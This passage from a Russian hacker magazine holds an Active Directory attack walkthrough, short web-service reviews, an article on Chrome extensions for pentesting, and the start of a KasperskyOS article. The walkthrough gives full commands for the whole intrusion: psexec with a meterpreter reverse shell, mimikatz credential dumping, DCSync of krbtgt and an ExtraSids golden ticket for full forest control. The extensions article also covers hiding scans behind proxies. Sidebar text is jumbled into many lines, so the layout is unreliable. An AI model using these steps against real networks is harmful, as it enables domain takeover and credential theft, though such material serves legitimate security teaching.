взаимоотношения. Затем любым удобным способом забираем файл (или его
текстовое содержимое) себе.
   Теперь нам понадобится скрипт DomainTrustExplorer. Запускаем его и пере-
даем в качестве параметра CSV-файл:

python trust_explorer.py trusts.csv

Получим своеобразный шелл, посмотреть все команды можно, набрав help.
Нас интересует самая полезная его фича — это возможность сохранить со-
бранные данные в формате GraphML. Работает одной командой:

TrustExplore> graphml_dump


НАНОСИМ НА КАРТУ
В результате получаем файл trusts.csv.graphml, этот формат уже можно от-
крывать в бесплатном редакторе yEd. Но здесь нужно совершить несколько
действий, чтобы получить красивую схему. После открытия файла с расшире-
нием .graphml следует сразу перейти в Edit -> Properties Mapper. Появится окно
настроек, в котором слева надо выбрать New Configuration (Node) и нажать зе-
леный плюс справа (см. рис. 4).





Рис. 4. Настройка yEd
Жмем кнопку Apply и выбираем в том же окне раздел New Configuration (Edge),
и точно так же нужно добавить новую запись, нажав на зеленый плюс справа
(см. рис. 5).





Рис. 5. Настройка yEd, продолжение

Теперь еще раз Apply, кнопка OK — окно закроется. Остался последний шаг,
идем в меню Tools -> Fit Node to Label. И теперь в меню Layout можно выбирать
любой понравившийся режим, например Hierarchical или Tree. При каждом из-
менении схема будет автоматически перестраиваться. В нашем случае полу-
чаем рис. 6.





Рис. 6. Схема AD


На схеме наглядно изображен весь лес, напомню, что на данный момент мы
обладаем привилегиями доменного пользователя в домене DEV.HIGH-SEC-
CORP.LOCAL. Здесь и далее используются вымышленные имена доменов и под-
доменов, любые совпадения случайны. Теперь у нас есть и графическая карта
леса, и информация о доверительных отношениях. Наша цель — корень леса,
поэтому самое время начать понемногу поднимать свои привилегии.
ВРАЖЕСКИЙ ЛИЧНЫЙ СОСТАВ
Имея текущую PowerShell-сессию (с импортированным
модулем PowerView), можно также подробно изучить
доменные группы и доменных пользователей.
   Смотрим, кто входит в группу доменных админов                                                       INFO
в нашем текущем домене:
                                                                   Red vs Blue: Modern
                                                                                      Active Directory Attacks
Get-NetGroup -Domain “dev.high-sec-corp.local”                                                                & Defense — это самый
 -GroupName “Domain Admins” -FullData                      яркий доклад по атакам
...                                                                     на AD последних лет,
                                                                        который провел Шонmember: {                                                                   Меткалф (Sean Metcalf)
  CN=john smedley,CN=Users,DC=dev,                             на конференции
  DC=high-sec-corp,DC=local,                                  DerbyCon в этом году.
  CN=Administrator,CN=Users,DC=dev,                                                                       Слайды
  DC=high-sec-corp,DC=local
}                                                                   Видео выступления
...

Видим, что присутствует некий john. Под-
робную информацию о любом доменном
пользователе можно получить, используя
другой командлет:

Get-NetUser -UserName *john*

Определившись с жертвой, можно даже по-
пробовать поискать следы ее присутствия
в нашем домене:

Invoke-UserHunter -Domain “dev.high-
sec-corp.local” -UserName john
UserDomain : dev.high-sec-corp.local
UserName : john
ComputerName : FILESRV.dev.high-sec-
corp.local
IP : 192.168.10.242
SessionFrom : 192.168.10.52

Что при этом произошло? Функция Invoke-
UserHunter  предназначена  для  поиска
пользователей в рамках домена. Она запу-   F-Droid собственной персоной
скает Get-NetSessions и Get-NetLoggedon против каждого сервера (используя
специальные API-функции NetSessionEnum и NetWkstaUserEnum) и сравнивает
результаты с указанными при запуске логинами.
   Очень удобная вещь, работает достаточно точно и опять же с правами ря-
дового доменного пользователя.
   Итак, мы нашли, где в данный момент находится доменный администратор.

ИДЕМ В НАСТУПЛЕНИЕ
Для дальнейших действий необходима учетка локального админа. Способов
поднятия привилегий до уровня локального администратора — множество.
Здесь и GPP, и Unattended installations, и атаки вида LDAP relay с использова-
нием бесценной утилиты Intercepter-NG, и многое другое (подробнее про раз-
личные способы можно прочитать в ][ #191 «Качаем права. Поднимаем приви-
легии до админа и выше»).
   Будем считать, что аккаунт локального админа (support1:megAPa$$) мы по-
лучили.
  Самое простое, что можно сделать дальше, — это попробовать получить
доступ к хосту, где залогинен доменный админ. Для этого воспользуемся мо-
дулем psexec, входящим в Метасплоит.

msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set RHOST 192.168.10.52
msf exploit(psexec) > set SMBUSER support1
msf exploit(psexec) > set SMBPASS megAPa$$
msf exploit(psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(psexec) > set LHOST 10.54.0.191
msf exploit(psexec) > set LPORT 8080

Здесь есть небольшой нюанс: напрямую жертву мы не видим (обычно она
находится за натом), поэтому перед запуском psexec необходимо добавить
маршрут в сеть жертвы:

msf exploit(psexec) > route add 192.168.10.0 255.255.255.0 1

Последнее значение — это номер сессии, сквозь которую и будет заворачи-
ваться трафик. Ну а теперь можно и запускать:

msf exploit(psexec) > exploit

В результате получаем шелл сразу с правами NT SYSTEM.
БЕРЕМ ПЛЕННЫХ
Теперь, имея новый шелл, было бы неплохо воспользоваться возможностями
известной утилиты mimikatz. Для этого вначале проверяем разрядность ОС:

meterpreter > sysinfo

В моем случае это х64. Затем выбираем любой подходящий x64-процесс:

meterpreter > ps

И мигрируем в него:

meterpreter > migrate 460

Можно использовать, например, LSASS или winlogon. Далее загружаем модуль
(в память жертвы):

meterpreter > load kiwi

И ищем учетку пользователя john:

meterpreter > creds_wdigest
[+] Running as SYSTEM
[*] Retrieving wdigest credentials
DEV john daPa$$w0rd

В случае успеха мы получаем пароль доменного админа для нашего текущего
домена DEV.

БЕРЕМ ПОД КОНТРОЛЬ УКРЕПРАЙОН
В небольших компаниях на этом можно и заканчивать работу. Но у нас все
только начинается. Теперь нам понадобится полная версия mimikatz (функ-
циональность, реализованная в Метасплоите, хороша, но часто не успева-
ет за новыми фичами основной версии). Дело в том, что недавно в mimikatz
была добавлена фича, получившая название DCSync. Ранее, как мы пом-
ним, для извлечения хешей с домен-контроллера нужно было получить до-
ступ либо к нему (а точнее, к базе NTDS.dit), либо к актуальной резервной
копии. Но автор mimikatz реализовал интересный прием, позволяющий уда-
ленно сграбить интересующие нас данные. Происходит запрос к контролле-
ру домена на репликацию учетных данных пользователя, с использованием
службы репликации каталогов (DRS), отсюда и название фичи. Естественно,
подобные действия требуют высоких привилегий, но пароль доменного ад-
министратора у нас-то уже есть.
   Запускаем (например, можно сделать migrate в процесс explorer.exe, при-
надлежащий пользователю john, и дальше запустить cmd командой shell).

mimikatz # lsadump::dcsync /user:DEV\krbtgt
[DC] ‘dev.high-sec-corp.local’ will be the domain
[DC] ‘DEV-DC02.dev.high-sec-corp.local’ will be the DC server
[DC] ‘DEV\krbtgt’ will be the user account
SAM Username : krbtgt
Password last change : 10.10.2015 17:53:13
Object Security ID : S-1-5-21-3576879279-70744307-2249533442-502
Credentials:
Hash NTLM: 1a3671958abf785fe7b32eaaa20b9020

Итак, получен хеш для krbtgt. Дело в том, что на каждом домен-контроллере
запущен сервис KDC (Kerberos Distribution Center), который обрабатывает все
запросы на тикеты. При этом в качестве сервисного аккаунта используется ло-
кальный дефолтный аккаунт krbtgt. Именно эта учетка используется для шиф-
рования и подписывания всех Kerberos-тикетов в отдельно взятом домене.
Для многих администраторов krbtgt покрыт своеобразным мистическим на-
летом, и его стараются попросту не трогать. Поэтому в большинстве случаев
этот аккаунт не меняется с момента поднятия AD. И если подобный хеш попа-
дет в руки злоумышленников — пиши пропало. Они без труда смогут созда-
вать свои Kerberos «голден тикеты». Эти тикеты предоставят атакующим до-
ступ к чему угодно работающему по Kerberos, при этом не нужно даже быть
участниками домена. Поэтому аккаунт krbtgt — это ключ от Kerberos в любом
домене; обладая его хешем, можно контролировать весь домен, выписывать
себе Kerberos-тикеты с любыми полномочиями, на длительный срок действия
(десять лет).

ПОЛНЫЙ КОНТРОЛЬ НАД ЛЕСОМ
Теперь, после компрометации дочернего домена, остается последний ру-
беж — корень леса. В этом деле нам снова пригодится mimikatz и еще одна его
фича, получившая название ExtraSids. Эта фича, позволяет указать допзначе-
ние SID из других доменов при формировании голден тикета. При этом уста-
навливается значение ExtraSids в структуре KERB_VALIDATION_INFO, во время
формирования керберос тикета. Идея всего этого в том, что компрометация
любого дочернего домена в лесу означает компрометацию родительского до-
мена, а значит, и компрометацию всего леса.
  Для проведения подобной атаки нам понадобится:
•  krbtgt-хеш для дочернего домена DEV (уже получили);
•  SID домена DEV (тоже получили в том же выводе, где и krbtgt);
•  дополнительный, он же экстра SID группы энтерпрайз-админов (можно по-
   лучить без особого труда).

Итак, получаем недостающий фрагмент, для этого в очередной раз восполь-
зуемся PowerShell и модулем PowerView:

Convert-NameToSid high-sec-corp.local\krbtgt
S-1-5-21-2941561648-383941485-1389968811-502

И здесь нужно заменить -502 на -519, чтобы вышел SID группы Enterprise
Admins для корневого домена. Все данные получены, выполняем следующую
конструкцию:

kerberos::golden
  /user:Administrator
  /krbtgt:1a3671958abf785fe7b32eaaa20b9020
  /domain:dev.high-sec-corp.local
  /sid:S-1-5-21-3576879279-70744307-2249533442
  /sids:S-1-5-21-2941561648-383941485-1389968811-519
  /ptt





Рис. 7. mimikatz ExtraSIDs

Теперь проверяем результат наших действий.
До

C:\Users\john>dir \\PRIMARY-DC.high-sec-corp.local\C$
Access is denied.

После

C:\Users\john>dir \\PRIMARY-DC.high-sec-corp.local\C$
Volume in drive \\PRIMARY-DC.high-sec-corp.local\C$ has no label.
Volume Serial Number is E478-32C1
Directory of \\PRIMARY-DC.high-sec-corp.local\C$
...


КОНТРОЛЬНЫЙ ВЫСТРЕЛ
Получив и использовав тикет с extraSID’ом, можно приме-
нить уже рассмотренную технику DCSync для того, чтобы
достать хеши с корневого домена. Но здесь есть неболь-
шое отличие: так как мы решили замахнуться на другой до-
мен, то, помимо параметра user, необходимо указать еще
                                    WWW
и корневой домен.
Команда для mimikatz выходит следующая:                          Наверное, лучший
                                                                                  ресурс, раскрыва-
                                                              ющий все аспектыmimikatz # lsadump::dcsync                                                                       защиты и уязвимо-
  /user:HIGH-SEC-CORP\krbtgt                                             стей AD, —
  /domain:high-sec-corp.local                                                adsecurity.org.
                                                                              Автор этого блога
                                                             Шон Меткалф (Sean
Если корневой домен держится на нескольких контрол-                                                                                           Metcalf) занимается
лерах, то можно добавить опцию /dc:, указав полное имя     и защитой и вопро-
(FQDN) контроллера. В результате мы получаем хеш krbtgt    сами безопасности,
                                                                           связанными с AD
с корневого домен-контроллера. А это значит, что с этого                                                                                 в крупном энтер-
момента весь лес скомпрометирован и атакующий может          прайзе.
создавать себе практические любые Kerberos-тикеты.

РАЗБОР ПОЛЕТОВ
В начале существования Active Directory границами ее безопасности счита-
лись домены. Администраторы одного леса совсем не обязательно должны
были доверять друг другу и могли быть разделены на домены. Но со време-
нем ситуация изменилась, в начале 2000-x появились различные уязвимости,
затрагивающие AD (например, MS02-001). В результате граница безопасно-
сти для Active Directory была смещена с домена на лес. И хотя мысль о том,
что каждый отдельно взятый домен является границей безопасности, сильно
ошибочна, такое мнение по-прежнему часто встречается на практике.
  Защита крупного леса AD — это комплексная и непростая задача, кото-
рая состоит из множества деталей. Это постоянный мониторинг как логов,
так и сетевой активности, грамотные политики и многое другое. И при всем
этом следует помнить, что компрометация одного доменного администрато-
ра, а значит, и какого-либо единичного домена может моментально привести
к компрометации всего леса.
PC ZONE





       SEARCHCODE
             searchcode.com
 1





           Searchcode — новый поисковик по исходным кодам

                                  Ходить за строчкой кода в Google для программистов се-
          годня настолько же привычно, насколько раньше было привычно
          смотреть в справочник. Существуют и специализированные по-
          исковики. Searchcode — недавнее пополнение в их списке.
            Создает Searchcode один-единственный разработчик. Впервые
          сайт был запущен в 2013 году, потом одно время не работал, но те-
         перь автор снова взялся за него.
         Из сильных сторон Searchcode: приятный интерфейс, открытые
        API и возможность при помощи ключевых слов ограничить поиск
       определенным языком программирования или источником. Выдача
       тоже выглядит отлично: отмечены номера строк, есть возможность
        подстроить фильтры уже после поиска.
         Ищет Searchcode не во всем интернете, как это делает Google,
        а лишь в опенсорсных репозиториях. Среди них GitHub, Bitbucket,
        Google Code, Codeplex, Sourceforge, Fedora Project и прочие. Глав-
        ная страница Searchcode гласит, что всего на данный момент про-
       индексировано более семи миллионов проектов.
          У Searchcode есть несколько конкурентов: Krugle, Openhub.net и,
        конечно, поиск, встроенный в GitHub. Однако, если разработчик-о-
        диночка продолжит развивать свой сервис, у него есть все шансы
        на успех и популярность. Уже сейчас Searchcode выглядит многоо-
       бещающе.
          Зарабатывать автор Searchcode, похоже, планирует на лицен-
       зировании своего движка — автономная версия сможет рабо-
         тать локально и пригодится компаниям — разработчикам софта.


      INOREADER
          www.inoreader.com
2





          Inoreader — агрегатор RSS с мощными фильтрами

                              Когда-то давно, в далеком 2012 году, любители RSS не знали
       бед и поголовно использовали Google Reader как в виде веб-прило-
жения, так и в качестве бэкенда для синхронизации. Когда в Google
решили, что Reader больше не нужен, и отключили его, людям ни-
чего не оставалось, кроме как разойтись по мелким независимым
сервисам. Те, в свою очередь, стали плодиться как грибы после до-
ждя, и выбрать подходящий теперь не так-то просто.
  Место во главе колонны сейчас занимает Feedly, но если прой-
тись по его конкурентам, то можно встретить большое разнообра-
зие как дополнительных функций, так и интересных решений в обла-
сти интерфейса. После продолжительных поисков мы остановились
на сервисе Inoreader польского происхождения. Интересен он в ос-
новном с точки зрения функциональности.
   Главная фишка Inoreader — это возможность фильтровать фиды
по заданным правилам. Можно, к примеру, перечислить список
слов, которые должны (или не должны) присутствовать в заголовке,
отфильтровать фиды по автору или URL, задать ограничение по на-
личию картинок, видео или прикрепленных файлов.
  Помимо фильтров, поддерживаются «правила» — они срабаты-
вают, когда в фиде появляется пост, соответствующий критериям,
и совершают некое действие. Можно добавлять постам теги и звез-
дочки, автоматически пересылать в сервисы вроде Evernote, Pocket
и Instapaper и даже отправлять пуш-уведомления через мобильное
приложение Inoreader.
   Пользоваться фирменным приложением, кстати, необязатель-
но — ряд программ для iOS и Android поддерживает синхронизацию
с Inoreader. Маководам вообще повезло — Inoreader поддержива-
ется в Reeder, одной из лучших читалок, у которой есть версия как
для iOS, так и для OS X. Собственно, половина смысла переходить
на Inoreader — как раз в том, чтобы получить отфильтрованные фиды
не только на десктопе, но и на мобильных устройствах.
   Ну и пару слов о неприятной стороне сервиса: он, как и большин-
ство аналогов, стоит денег. В бесплатном варианте в RSS вставля-
ются баннеры, а число правил ограничено всего одним. Аккаунт с 20
правилами и 20 фильтрами обойдется в 30 долларов в год, а все
ограничения сняты в версии за 50 долларов в год.
      GEEKTYPER
           geektyper.com
3





         GeekTyper — симулятор «голливудского хакера»

                              Редко когда фильм про хакеров обходится без сцены, в кото-
       рой герой с поразительной прытью стучит по клавиатуре, а по экрану
         бегут загадочные строки с кодом. Даже если там написана не пол-
        ная ерунда (яркий пример — сериал Mr. Robot), в жизни тебе вряд
        ли удастся достичь такой ошеломительной скорости.
         Но иногда важно не то, что ты делаешь, а то, как это выглядит.
      В таких случаях тебе поможет сайт geektyper.com. Открываешь его,
        разворачиваешь браузер на полный экран и можешь начинать сту-
         чать по кнопкам — на экране будут бежать те самые случайные, но
       эффектно выглядящие строки кода. На выбор разные темы оформ-
        ления, в том числе с логотипом невнятной правительственной орга-
        низации (с подозрительно знакомым сокращением), «под Матрицу»
        или даже в стиле Aperture Science из игры Portal. Для тех, кто желает
        изобразить продуктивную работу, есть темы Microsoft Word и Visual
         Studio.
          Обрати внимание на папочки справа: DL Data откроет окно, кото-
       рое изображает скачивание очень важных данных, Terminal — под-
        дельное окно терминала с еще более мутными строками, но летя-
      щими по экрану без твоего участия, а также All Scripts, откуда можно
        вызвать самые разнообразные диалоговые окна — от расшифровки
        паролей до установки спутниковой связи (впечатляющий крутящий-
        ся земной шар прилагается).
   У сайта есть и мобильная версия со своей экранной клавиату-
рой. На iOS страницу можно добавить на экран «Домой», и она бу-
дет работать в офлайне. В общем, красота.
   Что со всем этим делать, решай сам: можешь попробовать разы-
грать приятелей, поразить особенно наивную подругу или исполь-
зовать в съемках фильма. Выглядеть крутым хакером еще никогда
не было так просто!
PC ZONE
ХРОМОВЫЙ
СПЛАВ               PC ZONE





        84ckf1r3
    84ckf1r3@gmail.com

КАК ВЫКОВАТЬ
ИЗ БРАУЗЕРА
ХАКЕРСКИЙ
ИНСТРУМЕНТ
Название «хакерские утилиты» постепенно
приобрело негативный смысл. На них руга-
ются антивирусы и косятся пользователи,
ставя в один ряд с потенциальными угро-
                                                       INFOзами. Между тем выполнять аудит и дру-
гие нетривиальные задачи можно просто          Помимо Chrome
из браузера, если его подготовить должным       и Firefox, анало-
                                                                          гичные расшире-
образом. В этой статье рассматриваются          ния есть для Opera
соответствующие дополнения для Chrome,         и других браузе-                                                                                  ров. Часть из них
                                                                            доступна в офици-но их аналоги можно найти и для Firefox.
                                                                          альных магазинах
                                                                          или на сайтах
                                                                               разработчиков,
Прелесть современных браузеров состоит в том, что они       а для других про-
могут заменить собой целый набор утилит, совершен-         ектов домом
                                                                                 стал GitHub. Ихно не вызывая подозрений. Это уже не просто средства                                                                          функциональность
просмотра веб-страниц, а универсальные платформы       во многом пере-
для взаимодействия с любыми удаленными сервисами.       крывается, поэ-
                                                                          тому рекомендуюИтак, открываем chrome://extensions/ или about:addons
                                                                           попробовать все
и аддон за аддоном превращаем браузер в мощное                                                                       и оставить только
средство для пентеста.                                           самые нужные.

IP ADDRESS AND DOMAIN INFORMATION
Любой операции предшествует разведка, и с ней нам
поможет расширение сайта TCPIPutils.com. Получив
IP, он предоставляет много интересной информации
о веб-странице, домене и провайдере, который ее хо-                                              WARNING
стит. Удобно, что на отдельной вкладке можно посмо-
треть свой текущий IP и увидеть, какой адрес твоего     Выполнение аудита безо-
компьютера сейчас определяют сайты. Установить рас-    пасности подразумевает по-
                                                                        лучение предварительногоширение можно из официального магазина Chrome.                                                                        согласия владельца ресурса
                                                                    и в большинстве случаев
SHODAN                                                             требует наличия лицензии.
                                                                     Без них можно тестиро-Следующий этап после просмотра записей из откры-                                                                              вать только собственный
тых баз официальных регистраторов — это проверка                                                                                сайт. Ни редакция, ни автор
сайта через теневой поисковик Shodan. Он также по-      не несут ответственности
кажет владельца IP-адреса на карте, выдаст список       за любой вред, причи-
                                                                    ненный необдуманным
открытых портов и сервисов на них, включая номер                                                                     использованием описанных
версии. Бесплатное расширение доступно на shodan.           дополнений.
io и в магазине Chrome.
Поисковик для темной стороны

PORT SCANNER
Узнать еще больше об открытых портах на удаленном узле и выяснить их со-
стояние в данный момент помогает расширение с говорящим названием Port
Scanner. Написал его программист из Индии Ашок Мунишвара. Находясь
на одной странице, можно сканировать сервер совершенно другой. Отдель-
ными кнопками задается сканирование только открытых или уязвимых (наи-
более часто используемых троянами) портов. Диапазон TCP-портов тоже за-
дается вручную. Для удобства введенные адреса запоминаются — потом их
можно выбрать из всплывающих подсказок по мере ввода.





C любой страницы сканируем любую
PROXY SWITCHYOMEGA
Сканировать порты со своего IP-адреса может оказаться не лучшей идеей.
Многие серверы оснащаются продвинутыми брандмауэрами и системами
предотвращения вторжения, которые сочтут опрос портов началом атаки.
Как минимум твой IP занесут в черный список. Как максимум — тебя навестят
и не очень вежливо предложат ответить на пару вопросов. Избежать визита
непрошеных гостей или хотя бы отсрочить его помогут анонимные прокси.
Среди множества вариантов их использования это дополнение (ранее извест-
ное как Proxy SwitchySharp) предлагает довольно простой и удобный способ.
Ставится Proxy SwitchyOmega в два клика и после настройки работает автома-
тически по заданным правилам.





Настройка правил для переключения прокси

EDITTHISCOOKIE
Сегодня каждый сайт норовит присвоить твоему компьютеру временный иден-
тификатор, который сохраняется в куки вместе с другими демаскирующими
тебя параметрами.
  С установкой расширения EditThisCookie появляется простая возможность
управлять всеми печеньками. Менеджер отображает только куки, относящи-
еся к активной веб-странице. Поэтому их можно быстро находить без ручных
фильтров, удалять, защищать от удаления, блокировать и даже править в от-
дельном окне.
Изменение идентификатора в куки


THE EXPLOIT DATABASE
После сбора разведданных и предварительной подготовки пора приниматься
за дело и отыскать на выбранном сайте уязвимости. Это расширение предо-
ставляет удобный доступ к большой (и, что важнее, обновляемой) базе экспло-
итов из архива Offensive Security. По умолчанию апдейты проверяются каждые
пять минут, а все новые уязвимости сортируются по дате, типу, автору и описа-
нию. Установить его можно из магазина Chrome. Оно отлично работает в паре
с приложением GHDB.

GHDB (GOOGLE HACK DATA BASE)
Это приложение для Chrome с быстрым запуском из панели. В нем собраны
примеры хитрых запросов, которые позволяют быстро отыскать через Google
сетевое оборудование и веб-платформы с известными уязвимостями. В от-
дельный раздел включены типовые запросы для сетевых камер, систем видео-
наблюдения и принтеров. Также своего раздела удостоились процедуры поис-
ка встроенных учетных записей и специфических ошибок. На двух последних
вкладках собраны разные примеры — от поиска директорий с урожаем цен-
ных данных до конфигурационных файлов Cisco PIX. Ирония в том, что Google
спокойно позволяет установить GHDB из собственного магазина.
Примеры хитрых поисковых запросов

XSS RAYS
Мощный инструмент для тестов на проникновение с использованием XSS-а-
так. Включает в себя сканер уязвимостей, инспектор скриптов, инжектор форм,
менеджер событий, а также функции обратной разработки. Может извлекать
любые формы и даже позволяет редактировать их на лету, не меняя исход-
ный объект. Умеет выполнять продвинутый поиск по ключевым словам, причем
не только в теле HTML-страниц, но и в скриптах и внешних обработчиках собы-
тий. Помогает разобраться в структуре сложных сайтов и понять, как проис-
ходит обработка любой отображаемой или скрытой формы. Скачать XSS Rays
также можно бесплатно.





Изучение содержимого форм
HPP FINDER
Это расширение незаметно выполняет фоновую проверку сайта в активной
вкладке. Оно ищет элементы веб-приложений, подверженных уязвимости
HTTP Parameter Pollution. Во многих случаях атака по типу смешения границ
параметров дает возможность обхода WAF и выполнения SQL-инжектов. Она
работает там, где блокируются методы XSS. Подозрительные с точки зрения
WAF запросы в таких элементах расщепляются на безобидные фрагменты,
которые из-за особенностей обработки склеиваются в одну команду за счет
использования одноименных параметров. HPP Finder использует метод, об-
наруженный более пяти лет назад. Однако найденная уязвимость затрагивает
фундаментальные недостатки RFC3986 и потому актуальна до сих пор. Испра-
вить удается только ее проявление в конкретном приложении, и то не всегда.





HPP дополняет XSS и позволяет обойти WAF


FIREBUG LITE FOR GOOGLE CHROME
Firebug обеспечивает визуальный анализ исходного кода веб-страниц, таблиц
CSS, скриптов и объектов DOM с возможностью исправлять содержимое ка-
ждой секции. При переходе по разным фрагментам кода соответствующие
ему элементы страницы выделяются цветовой рамкой. Firebug помогает вы-
яснить, как работает веб-приложение, и провести его аудит. Это одно из не-
многих расширений, которое можно скачать, но нельзя запустить на странице
магазина Chrome из соображений безопасности.





Firebug — консоль, инспектор и отладчик

D3CODER
При анализе содержимого веб-страниц и скриптов ты часто
увидишь данные в формате Base64, ROT13 или другой ко-
дировке. Также может понадобиться перевести в читаемый
вид временные метки из разных систем отсчета, раскоди-    WWW
ровать URI/URL или посчитать какой-нибудь хеш. Со всеми                                                                    Пример уязвимости
этими задачами поможет справиться одно расширение —          HPP
d3coder. Оно вызывается из контекстного меню и обладает
                                                                           База эксплоитовхорошим набором функций, но его юзабилити еще далеко
от совершенства. Например, результаты работы расшире-                                                                               Google Chrome
ния часто отображаются во всплывающем окне без воз-            Portable
можности выделения и копирования.

FORM FUZZER
Необычный инструмент для работы с формами любого типа, включая скрытые.
Автоматически наполняет их заданным текстом или случайным набором сим-
волов определенной длины, чтобы можно было проверить их дальнейшую об-
работку на сайте. Также умеет отмечать чекбоксы, переключать «радиокнопки»
и проверять другие интерактивные функции веб-страницы. Имеет множество
настроек. В пентесте Form Fuzzer часто используется для ускорения XSS-атак
и SQL-инжектов. Несмотря на такие качества, это расширение можно скачать
в магазине Chrome.





FormFuzzer — изучаем интерактивные формы


REQUEST MAKER
Это расширение используется для отправки стандартных или измененных за-
просов на сервер и анализа ответных пакетов. Может применяться для подме-
ны URL и модификации заголовков писем и поддерживает работу с формами.
Также пригодится для атаки на веб-приложения путем изменения HTTP-запро-
сов. По умолчанию Request Maker запускается из меню «Дополнения» при на-
жатии кнопки «Параметры». Мини-справка встроена под каждым пунктом на-
строек, и ее стиль пылает сарказмом.





Request Maker — пусть тайное станет явным!
IMACROS FOR CHROME
iMacros экономит время, позволяя автоматизировать рутинные операции.
К примеру, при выполнении пентеста часто приходится повторять одни и те же
действия на разных страницах сайта. iMacros может записать их и воспроиз-
водить с заданными настройками. Типовые задачи уже есть в базе примеров,
на которых легко создать собственные.





iMacros — хакер должен быть ленивым!


WEB DEVELOPER
Очень удобное средство для быстрого изменения настроек. Web Developer
умеет в один клик включать и отключать плагины, обработку JavaScript, вывод
уведомлений и всплывающих окон. Имеет отдельные вкладки для управления
cookies, CSS, интерактивными формами и загрузкой картинок. В разделе Tools
содержится вьювер исходного кода веб-страниц и восемь инструментов ва-
лидации через внешние веб-сервисы, к которым можно добавить свои.

PANIC BUTTON PLUS
Опытный хакер успевает съесть ноутбук до того, как его арестуют, но не всегда
нужны столь кардинальные меры. Иногда достаточно просто спрятать вклад-
ки от коллег, оставив безобидную страницу Google. Сделать это в один клик
поможет кнопка Panic. Если боишься, что в ответственный момент рука мо-
жет дрогнуть, то назначь команду маскировки по нажатию горячих клавиш. По-
вторная активация кнопки вернет все вкладки на свои места, поэтому лучше
добавить парольную защиту в настройках.
В случае паники нажать на кнопку и выдавить монитор
СЦЕНА
БЕЗОПАСНОСТЬ
В KASPERSKYOSОПЕРАЦИОННАЯ СИСТЕМА
«ЛАБОРАТОРИИ КАСПЕРСКОГО» ИЗНУТРИ





                                                                          Евгений Лебеденко
                                                                                              deardiarylj@gmail.com
В «Лаборатории Касперского» уже четыре года идет ра-
бота над собственной защищенной операционной си-
стемой, однако знают о ней в основном профессионалы.
Дело в том, что это не обычная ОС, и ее цель — защитить
производственные процессы от хакерских атак. В этой
статье мы расскажем о том, какие именно принципы безо-
пасности лежат в основе KasperskyOS.


16 октября 2012 года Евгений Касперский, генеральный директор всем из-
вестной софтверной компании, рассуждал на страницах своего ЖЖ о буду-
щем. Естественно, не о светлом и безоблачном (такие пассажи — дело полити-
ков), а о жутком будущем, наполненном кибернетическими угрозами, которые
обрушиваются не столько на мирных владельцев ПК, планшетов и смартфо-
нов (основных клиентов его компании), сколько на информационные системы
«заводов, газет, пароходов», официально именуемые ICS — Industrial Control
Systems.
  Системы эти управляют технологическими процессами и базируются
на программном обеспечении, которое зачастую, прекрасно выполняя свою
основную функцию, нисколько не заботится об информационной безопасно-
сти этого самого процесса. Возможно, при разработке такого ПО вопросы ки-
бербезопасности и не были приоритетными, просто теперь на них перестали
смотреть как на угрозы, высосанные из пальца.
  Основа типовой информационной системы ICS — сеть управления техно-
логическим процессом, которая может быть никак не защищена от доступа
из обычной корпоративной сети.
   Проекты, подобные первопроходцу Stuxnet, успешные проникновения в си-
стемы авионики лайнеров через мультимедийные системы пассажирских кре-
сел и публичные бортовые сети + Wi-Fi — далеко не живописание апокалипти-
ческого будущего, а самая что ни на есть реальность.





В 2013 году консультант по безопасности Хьюго Тесо шокировал
производителей авиалайнеров, получив доступ к системам авионики
Airbus через бортовую Wi-Fi-сеть с помощью приложения для Android

Касперский, однако, не только давал мрачные прогно-
зы. В том посте он, по сути, описывал принципы, которые
были заложены в основу новой разработки — операци-
онной системы, архитектурно ориентированной на си-        INFO
стемное решение проблемы киберзащиты технологиче-
                                                                           Первоначальное
ских процессов.                                                                            название проекта
   То был далекий 2012 год. Что стало с этой задум-        «11.11» несколько
кой через три года? Из намерений и описаний принци-       раз менялось. При-
                                                                      мерно в серединепов операционная система «Лаборатории Касперско-                                                                                пути он именовался
го» превратилась в реальность — KasperskyOS. Вернее,           KAKOS.
в комплексное решение Kaspersky Security System, встроенное «из коробки»
в KasperskyOS и доступное для встраивания в операционные системы других
производителей, а также реализованное в защищенном гипервизоре.
   Теперь это решение, вдоволь обкатанное на многочисленных конференци-
ях и форумах по кибербезопасности, шагнуло из лабораторных стен в реаль-
ные проекты.

ОРАНЖЕВОЕ НЕБО, ОРАНЖЕВАЯ КНИГА
Тот пост из ЖЖ Касперского был фактически публичным представлением про-
екта «11.11», который ЛК инициировала, судя по всему, еще в ноябре 2011 года
(«ноябрь 2011-го» — это и есть «11.11»), то есть за год до официального анонса.
Оно и правильно. Выходить на публику стоит не с мифологией, а с подтверж-
дением работоспособности идеи или как минимум с четким пониманием того,
как она должна работать.
    ][ после анонса проекта «11.11» одним из первых пообщался с его иде-
ологом — Андреем Петровичем Духваловым, который ныне возглавляет
управление перспективных технологий «Лаборатории Касперского». В этой
беседе обсуждались принципы, положенные в основу проекта «ОС Кас-
перского», и, что немаловажно, были получены ответы на вопросы «зачем?»
и «почему?».
  Зачем пытаться защитить ICS-системы с помощью системного ПО, если до-
статочно поместить их под колпак контролируемой зоны, обрубив возможные
каналы несанкционированного доступа? Зачем начинать делать собственную
операционную систему, если сейчас полно готовых решений? Почему «Ла-
боратории Касперского» стала интересна тема операционных систем, пусть
даже и в узкой области применения?
  На все эти вопросы были даны ответы, которые спустя три года развития
проекта Kaspersky Security System все еще актуальны, поскольку определяют
парадигму проекта. Сводится она к следующему. Все современные операци-
онные системы в той или иной степени уязвимы. И связано такое положение
дел не с кривыми руками их разработчиков, а с тем фактом, что проектирова-
лись они без четкого представления о безопасности и о комплексной цели,
которую должна решать подсистема безопасности ОС.
   Поскольку операционные системы совершенствуются одновременно с же-
лезом, они, независимо от изначально заложенной архитектуры, развиваются
по принципу помещичьей усадьбы: главное здание со временем обрастает
многочисленными флигелями, пристройками, чердаками и подвалами. Расту-
щая сложность организации с точки зрения безопасности несет две пробле-
мы: внедряемые механизмы безопасности, как встраиваемые, так и «навеши-
ваемые», просто не в состоянии охватить целиком все «закоулки» «ОСобняка».
Отсюда и появление разнообразных бэкдоров.
  Но это проблема принципиальной реализуемости механизмов безопас-
ности. Сложная организация операционных систем существенно затрудня-
ет как анализ потенциальной уязвимости компонентов, так и эффективность
применяемых механизмов безопасности. Будь все иначе, та же «Лаборатория
Касперского» с ее антивирусными решениями просто осталась бы не у дел.
  Вывод из всего этого достаточно банален. Уж если что-то делать в области
